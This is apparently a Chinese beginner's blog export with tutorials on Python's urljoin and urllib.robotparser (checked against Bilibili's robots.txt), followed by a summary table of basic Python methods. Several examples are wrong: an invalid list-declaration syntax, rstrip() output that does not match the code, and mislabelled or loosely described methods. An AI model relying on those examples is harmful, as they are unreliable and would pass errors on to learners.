<div class="note danger simple"><p>他的判断方式：<code>scheme</code>、<code>netloc</code> 和 <code>path</code>。如果这 3 项在新的链接就是第二个参数里面，就抛弃第一个参数</p>
</div>

<p>  测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line">print(urljoin(<span class="string">&#x27;http://www.baidu.com&#x27;</span>, <span class="string">&#x27;FAQ.html&#x27;</span>))</span><br><span class="line">print(urljoin(<span class="string">&#x27;http://www.baidu.com&#x27;</span>, <span class="string">&#x27;https://cuiqingcai.com/FAQ.html&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>结果可以看见第四行第一个参数<code>http://www.baidu.com</code>被抛弃了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com&#x2F;FAQ.html</span><br><span class="line">https:&#x2F;&#x2F;cuiqingcai.com&#x2F;FAQ.html</span><br></pre></td></tr></table></figure>


<h1 id="robotparser-模块"><a href="#robotparser-模块" class="headerlink" title="robotparser 模块"></a>robotparser 模块</h1><div class="note info simple"><p>利用 urllib 的 <code>robotparser</code> 模块，我们可以实现网站 Robots 协议的分析</p>
</div>

<div class="note info simple"><p>request模块模块在urllib文件夹里面.</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210210173305572.png" alt="image-20210210173305572"></p>
<h2 id="Robots-协议"><a href="#Robots-协议" class="headerlink" title="Robots 协议"></a>Robots 协议</h2><p>可以看我的这个文章<a class="btn-beautify button--animated green larger" href="https://www.zssnp.top/2021/02/12/Robots/" 
  title="Robots 协议"><i class="far fa-hand-point-right fa-fw"></i><span>Robots 协议</span></a></p>
<h2 id="RobotFileParser类"><a href="#RobotFileParser类" class="headerlink" title="RobotFileParser类"></a>RobotFileParser类</h2><p>robotparser文件里面就这个一个类</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210212180349862.png" alt="image-20210212180349862"></p>
<h3 id="RobotFileParser类的方法"><a href="#RobotFileParser类的方法" class="headerlink" title="RobotFileParser类的方法"></a>RobotFileParser类的方法</h3><div class="note info simple"><p>可以看见一眼就能看我就这几个方法</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210212180520332.png" alt="image-20210212180520332"></p>
<table>
<thead>
<tr>
<th align="center">robotparser的方法</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>set_url()</code></td>
<td align="center">设置 robots.txt 文件的链接，如果robotparser他传入url就不需要再使用这个方法设置了</td>
</tr>
<tr>
<td align="center"><code>read()</code></td>
<td align="center">读取 robots.txt 文件并进行分析，不调用这个方法接下来的判断都会为 <code>False</code></td>
</tr>
<tr>
<td align="center"><code>parse()</code></td>
<td align="center">解析 robots.txt 文件传入参数是 robots.txt 某些行的内容，会按照 robots.txt 语法来分析内容</td>
</tr>
<tr>
<td align="center"><code>can_fetch()</code></td>
<td align="center">有两参数一个是 <code>User-agent</code>，二个是要抓取的 URL，判断是否可以爬，返回结果 <code>True</code> 或 <code>False</code></td>
</tr>
<tr>
<td align="center"><code>mtime()</code></td>
<td align="center">返回上次抓取和分析 robots.txt 的时间，对长时间抓取一个网址很有用</td>
</tr>
<tr>
<td align="center"><code>modified()</code></td>
<td align="center">将当前时间设置为上次抓取和分析 robots.txt 的时间，对长时间抓取一个网址很有用</td>
</tr>
</tbody></table>
<div class="note primary simple"><p>测试就用我最喜欢的B站来测试嘻嘻</p>
</div>

<div class="note primary simple"><p>我们看一下B站那个网页下面这个几个路径不能爬</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210212183258112.png" alt="image-20210212183258112"></p>
<div class="note primary simple"><p>我找一个能爬URL：<code>https://www.bilibili.com/v/popular/all</code>这个可以爬</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210212183423771.png" alt="image-20210212183423771"></p>
<div class="note info simple"><p>我用python来判断那个可以爬</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.robotparser <span class="keyword">import</span> RobotFileParser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rp = RobotFileParser()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个也可以直接写到RobotFileParser()里面</span></span><br><span class="line">rp.set_url(<span class="string">&#x27;https://www.bilibili.com/robots.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 robots.txt 文件并进行分析</span></span><br><span class="line">rp.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有两参数一个是 User-agent，二个是要抓取的URL。这个v目录是可以爬的</span></span><br><span class="line">a=rp.can_fetch(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;https://www.bilibili.com/v/popular/all&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有两参数一个是 User-agent，二个是要抓取的URL。这个images目录是不可以爬的</span></span><br><span class="line">b=rp.can_fetch(<span class="string">&#x27;*&#x27;</span>, <span class="string">&quot;https://www.bilibili.com/images/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210212192155397.png" alt="image-20210212192155397"></p>
<div class="note primary simple"><p>也可以去掉<code>set_url()</code> 方法设置了 robots.txt 的链接</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.robotparser <span class="keyword">import</span> RobotFileParser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rp = RobotFileParser(<span class="string">&#x27;https://www.bilibili.com/robots.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 robots.txt 文件并进行分析</span></span><br><span class="line">rp.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有两参数一个是 User-agent，二个是要抓取的URL。这个v目录是可以爬的</span></span><br><span class="line">a=rp.can_fetch(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;https://www.bilibili.com/v/popular/all&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有两参数一个是 User-agent，二个是要抓取的URL。这个images目录是不可以爬的</span></span><br><span class="line">b=rp.can_fetch(<span class="string">&#x27;*&#x27;</span>, <span class="string">&quot;https://www.bilibili.com/images/&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>
<p>结果一样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210212192957574.png" alt="image-20210212192957574"></p>
<div class="note info simple"><p>可以使用 <code>parse()</code> 方法执行读取和分析</p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.robotparser <span class="keyword">import</span> RobotFileParser</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">rp = RobotFileParser()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起请求然后取得robots.txt里面的内容</span></span><br><span class="line">rp.parse(urlopen(<span class="string">&#x27;https://www.bilibili.com/robots.txt&#x27;</span>).read().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有两参数一个是 User-agent，二个是要抓取的URL。这个v目录是可以爬的</span></span><br><span class="line">a=rp.can_fetch(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;https://www.bilibili.com/v/popular/all&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有两参数一个是 User-agent，二个是要抓取的URL。这个images目录是不可以爬的</span></span><br><span class="line">b=rp.can_fetch(<span class="string">&#x27;*&#x27;</span>, <span class="string">&quot;https://www.bilibili.com/images/&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>
<p>结果一样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210212193235402.png" alt="image-20210212193235402"></p>
<div class="note primary simple"><p>上面的代码分析，其实就是这样</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.robotparser <span class="keyword">import</span> RobotFileParser</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">rp = RobotFileParser()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我直接写上</span></span><br><span class="line">robots=[</span><br><span class="line">         <span class="string">&#x27;User-agent: *&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;Disallow: /include/&#x27;</span>, </span><br><span class="line">         <span class="string">&#x27;Disallow: /mylist/&#x27;</span>, </span><br><span class="line">         <span class="string">&#x27;Disallow: /member/&#x27;</span>, </span><br><span class="line">         <span class="string">&#x27;Disallow: /images/&#x27;</span>, </span><br><span class="line">         <span class="string">&#x27;Disallow: /ass/&#x27;</span>, </span><br><span class="line">         <span class="string">&#x27;Disallow: /getapi&#x27;</span>, </span><br><span class="line">         <span class="string">&#x27;Disallow: /search&#x27;</span>, </span><br><span class="line">         <span class="string">&#x27;Disallow: /account&#x27;</span>, </span><br><span class="line">         <span class="string">&#x27;Disallow: /badlist.html&#x27;</span>, </span><br><span class="line">         <span class="string">&#x27;Disallow: /m/&#x27;</span>, </span><br><span class="line">         <span class="string">&#x27;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起请求然后取得robots.txt里面的内容</span></span><br><span class="line">rp.parse(robots)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有两参数一个是 User-agent，二个是要抓取的URL。这个v目录是可以爬的</span></span><br><span class="line">a=rp.can_fetch(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;https://www.bilibili.com/v/popular/all&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有两参数一个是 User-agent，二个是要抓取的URL。这个images目录是不可以爬的</span></span><br><span class="line">b=rp.can_fetch(<span class="string">&#x27;*&#x27;</span>, <span class="string">&quot;https://www.bilibili.com/images/&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>
<p>结果一样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210212193635655.png" alt="image-20210212193635655"></p>
]]></content>
      <categories>
        <category>Python爬虫</category>
      </categories>
      <tags>
        <tag>Python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>python基础总结</title>
    <url>/2020/05/01/python%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>为什么我要总结</strong></p>
<p><strong>应为就是编程语言学习的多了容易搞混，比如c语言的数组和python的列字典等搞混</strong></p>
<p><strong>还有我英语真的是小学等级的很多函数方法属性记不住我就写到这个了</strong></p>
<h1 id="总结方法-函数"><a href="#总结方法-函数" class="headerlink" title="总结方法/函数"></a>总结方法/函数</h1><h2 id="修改字符串"><a href="#修改字符串" class="headerlink" title="修改字符串"></a>修改字符串</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>title()</code>方法</td>
<td align="right">这个方法可以叫字符串首字母修改成大写</td>
</tr>
<tr>
<td align="center"><code>rstrip()</code>方法</td>
<td align="right">方法会移出尾的空格</td>
</tr>
<tr>
<td align="center"><code>strip()</code>方法</td>
<td align="right">方法会移出头和尾的空格</td>
</tr>
</tbody></table>
<h2 id="增加元素"><a href="#增加元素" class="headerlink" title="增加元素"></a>增加元素</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>append()</code>方法</td>
<td align="right">这个方法会在列表最后增加元素</td>
</tr>
<tr>
<td align="center"><code>insert()</code>方法</td>
<td align="right">这个方法可以在选择在那个地址增加元素</td>
</tr>
</tbody></table>
<h2 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>del</code>语句</td>
<td align="right">指定删除如何变量或元素字典</td>
</tr>
<tr>
<td align="center"><code>pop()</code>方法</td>
<td align="right">删除指定的元素,如果不指定默认删除最后一个,他返回被删除的值</td>
</tr>
<tr>
<td align="center"><code>remove()</code>方法</td>
<td align="right">指定元素内容删除</td>
</tr>
</tbody></table>
<h2 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>sort()</code>方法</td>
<td align="right">他会按大小进行排序，他是永久性的</td>
</tr>
<tr>
<td align="center"><code>sorted()</code>函数</td>
<td align="right">他会按大小进行排序，他是临时排序的</td>
</tr>
<tr>
<td align="center"><code>reverse()</code>方法</td>
<td align="right">倒着排序</td>
</tr>
</tbody></table>
<h2 id="查看列表长度"><a href="#查看列表长度" class="headerlink" title="查看列表长度"></a>查看列表长度</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>len()</code>函数</td>
<td align="right">查看列表长度</td>
</tr>
</tbody></table>
<h2 id="便利键值对"><a href="#便利键值对" class="headerlink" title="便利键值对"></a>便利键值对</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>items()</code>方法</td>
<td align="right">返回值返回可遍历的键, 值列表</td>
</tr>
<tr>
<td align="center"><code>keys()</code>方法</td>
<td align="right">返回值返回可遍历的键列表</td>
</tr>
<tr>
<td align="center"><code>values()</code>方法</td>
<td align="right">返回值返回可遍历的值列表</td>
</tr>
</tbody></table>
<h2 id="while循环常用的函数"><a href="#while循环常用的函数" class="headerlink" title="while循环常用的函数"></a>while循环常用的函数</h2><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>break</code>函数</td>
<td align="right">退出循环</td>
</tr>
<tr>
<td align="center"><code>continue</code>函数</td>
<td align="right">结束一次循环</td>
</tr>
</tbody></table>
<h2 id="查看可以用属性-方法"><a href="#查看可以用属性-方法" class="headerlink" title="查看可以用属性/方法"></a>查看可以用属性/方法</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>dir()</code>函数</td>
<td align="right">此函数会返回所现在可以用的属性和方法</td>
</tr>
</tbody></table>
<h2 id="id函数"><a href="#id函数" class="headerlink" title="id函数"></a>id函数</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>id</code>函数</td>
<td align="right">查看变量或其他的他所在的内存地址</td>
</tr>
</tbody></table>
<h2 id="查看可以用属性-方法-1"><a href="#查看可以用属性-方法-1" class="headerlink" title="查看可以用属性/方法"></a>查看可以用属性/方法</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>dir()</code>函数</td>
<td align="right">此函数会返回所现在可以用的属性和方法</td>
</tr>
</tbody></table>
<p>实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(name)</span><br><span class="line">[<span class="string">&#x27;__add__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__class_getitem__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__delitem__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__iadd__&#x27;</span>, <span class="string">&#x27;__imul__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__mul__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__reversed__&#x27;</span>, <span class="string">&#x27;__rmul__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;append&#x27;</span>, <span class="string">&#x27;clear&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;count&#x27;</span>, <span class="string">&#x27;extend&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;remove&#x27;</span>, <span class="string">&#x27;reverse&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>下面我就用一个<code>remove</code>方法</p>
<p><code>remove</code>方法指定元素内容删除</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name.remove(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure>


<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>文件操作常用到的函数</p>
<table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>open()</code>函数</td>
<td align="right">打开文件，并返回文件的对象</td>
</tr>
<tr>
<td align="center"><code>close()</code>方法</td>
<td align="right">关闭文件</td>
</tr>
<tr>
<td align="center"><code>read()</code>方法</td>
<td align="right">读取整个文件，将文件内容放到一个字符串变量中</td>
</tr>
<tr>
<td align="center"><code>readline()</code>方法</td>
<td align="right">读取一行，然后他会移动到下一行</td>
</tr>
<tr>
<td align="center"><code>write()</code> 函数</td>
<td align="right">可以向文件中写入指定内容</td>
</tr>
</tbody></table>
<h2 id="OS-模块"><a href="#OS-模块" class="headerlink" title="OS 模块"></a>OS 模块</h2><p>应为OS模块文件太多了我就列出几个常用的</p>
<table>
<thead>
<tr>
<th>os模块常用方法</th>
<th>相应的作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>os.getcwd()</code></td>
<td>返回当前工作目录</td>
</tr>
<tr>
<td><code>os.listdir(文件夹名)</code></td>
<td>目录列表</td>
</tr>
<tr>
<td><code>os.mkdir(文件夹名)</code></td>
<td>创建文件，只能创建一个单层文件，而不能嵌套创建，若文件夹存在则会抛出异常</td>
</tr>
<tr>
<td><code>os.makedirs(文件夹名/文件夹名)</code></td>
<td>创建多层目录 ，可以嵌套创建</td>
</tr>
<tr>
<td><code>os.rmdir(文件夹名)</code></td>
<td>删除单层目录，遇见目录非空时则会抛出异常</td>
</tr>
<tr>
<td><code>os.rename(文件名,文件名)</code></td>
<td>修改文件名</td>
</tr>
</tbody></table>
<h2 id="判断函数"><a href="#判断函数" class="headerlink" title="判断函数"></a>判断函数</h2><table>
<thead>
<tr>
<th>函数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>type()</code></td>
<td>返回对象的类型</td>
</tr>
<tr>
<td><code>isinstance()</code></td>
<td>如果要判断两个类型是否相同推荐使用</td>
</tr>
</tbody></table>
<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><table>
<thead>
<tr>
<th>函数/关键字</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>raise</code></td>
<td>关键字用于引发异常</td>
</tr>
</tbody></table>
<h2 id="数据类型强制转换函数"><a href="#数据类型强制转换函数" class="headerlink" title="数据类型强制转换函数"></a>数据类型强制转换函数</h2><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="right">强制转换</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>int()</code></td>
<td align="right">数字</td>
</tr>
<tr>
<td align="center"><code>str()</code></td>
<td align="right">字符串</td>
</tr>
<tr>
<td align="center"><code>bool()</code></td>
<td align="right">布尔值</td>
</tr>
<tr>
<td align="center"><code>list()</code></td>
<td align="right">列表</td>
</tr>
<tr>
<td align="center"><code>tuple()</code></td>
<td align="right">元组</td>
</tr>
<tr>
<td align="center"><code>dict()</code></td>
<td align="right">字典</td>
</tr>
</tbody></table>
<h2 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h2><table>
<thead>
<tr>
<th>函数/方法</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>split()</code></td>
<td>通过指定分隔符对字符串进行切片</td>
</tr>
<tr>
<td><code>isinstance()</code></td>
<td>函数来判断一个对象是否是一个已知的类型，类似 type()</td>
</tr>
<tr>
<td><code>zip()</code></td>
<td>可以将多个列表、元组、字典、字符串等“压缩”成一个 zip 对象</td>
</tr>
<tr>
<td><code>join()</code></td>
<td>方法用于将序列中的元素以指定的字符连接生成一个新的字符串</td>
</tr>
</tbody></table>
<h1 id="字符串修改"><a href="#字符串修改" class="headerlink" title="字符串修改"></a>字符串修改</h1><h2 id="修改字符串-1"><a href="#修改字符串-1" class="headerlink" title="修改字符串"></a>修改字符串</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>title()</code>方法</td>
<td align="right">这个方法可以叫字符串首字母修改成大写</td>
</tr>
<tr>
<td align="center"><code>rstrip()</code>方法</td>
<td align="right">方法会移出尾的空格</td>
</tr>
<tr>
<td align="center"><code>strip()</code>方法</td>
<td align="right">方法会移出头和尾的空格</td>
</tr>
<tr>
<td align="center"><code>zip()</code>函数</td>
<td align="right">他可以叫元素，列表，字典，字符串等打包成成一个 zip 对象</td>
</tr>
<tr>
<td align="center"><code>list()</code>函数</td>
<td align="right"></td>
</tr>
</tbody></table>
<ol>
<li><p>title()方法</p>
<p>这个方法可以叫字符串首字母修改成大写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=<span class="string">&quot;abc dcf&quot;</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name.title()) </span><br><span class="line">Abc Dcf </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure></li>
<li><p>rstrip()和strip()方法</p>
<p><code>rstrip()</code>方法会移出尾的空格</p>
<p><code>strip()</code>方法会移出头和尾的空格</p>
<p>下面是<code>rstrip()</code>方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=<span class="string">&quot;  abc  &quot;</span>    </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name.rstrip()) </span><br><span class="line"><span class="string">&#x27; abc &#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>


</li>
</ol>
<pre><code>下面是rstrip()方法</code></pre>
   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   &gt;&gt;&gt; name=<span class="string">&quot;  abc  &quot;</span>    </span><br><span class="line">   &gt;&gt;&gt; print(name.strip()) </span><br><span class="line"><span class="string">&#x27;abc&#x27;</span></span><br><span class="line">   &gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>python的列是用<code>[]</code>来声明的里面的内容叫元素</p>
<p>C语言的数组是这样声明的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[]=&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>python的列是这样声明的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h2 id="修改元素"><a href="#修改元素" class="headerlink" title="修改元素"></a>修改元素</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name[<span class="number">0</span>]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure>




<h2 id="增加元素-1"><a href="#增加元素-1" class="headerlink" title="增加元素"></a>增加元素</h2><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>append()</code>方法</td>
<td align="right">这个方法会在列表最后增加元素</td>
</tr>
<tr>
<td align="center"><code>insert()</code>方法</td>
<td align="right">这个方法可以在选择在那个地址增加元素</td>
</tr>
</tbody></table>
<h3 id="append-方法"><a href="#append-方法" class="headerlink" title="append()方法"></a>append()方法</h3><p>这个方法会在列表最后增加元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name.append(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(name)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>
